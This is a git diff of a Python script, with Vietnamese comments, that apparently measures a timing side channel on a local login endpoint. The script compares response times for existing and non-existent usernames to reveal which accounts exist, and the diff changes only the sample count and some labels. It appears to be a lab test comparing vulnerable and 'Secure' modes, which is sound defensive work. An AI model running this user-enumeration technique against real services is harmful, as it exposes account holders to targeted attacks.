@@ -6,7 +6,7 @@ import requests
 import time
 
 URL = "http://127.0.0.1:8000/api/auth/login"
-NUM_REQUESTS = 50 # Số lượng mẫu 
+NUM_REQUESTS = 100 # Số lượng mẫu 
 
 def measure_time(username, password):
     times = []
@@ -18,7 +18,7 @@ def measure_time(username, password):
     return sum(times) / len(times)
 
 def run_attack():
-    print("⏱️ BẮT ĐẦU KIỂM THỬ RÒ RỈ THỜI GIAN (TIMING ATTACK) ⏱️\n")
+    print("⏱️ TIMING ATTACK ⏱️\n")
     
     # Đo đạc trên tài khoản có tồn tại trong cơ sở dữ liệu
     print(f"Đang gửi {NUM_REQUESTS} requests cho tài khoản thật...")
@@ -33,7 +33,7 @@ def run_attack():
     print(f"- Thời gian máy chủ phản hồi User KHÔNG TỒN TẠI: {time_not_exist:.5f} giây")
     
     delta = abs(time_exist - time_not_exist)
-    print(f"\n=> ĐỘ LỆCH THỜI GIAN (Delta): {delta:.5f} giây")
+    print(f"\n=> ĐỘ LỆCH THỜI GIAN: {delta:.5f} giây")
     
     # Ngưỡng phát hiện đã được tinh chỉnh để bắt được độ lệch cực nhỏ của thuật toán MD5
     # Ở chế độ Secure, độ lệch sẽ tiệm cận 0.0 do hàm time.sleep() đồng bộ hóa toàn bộ truy vấn.
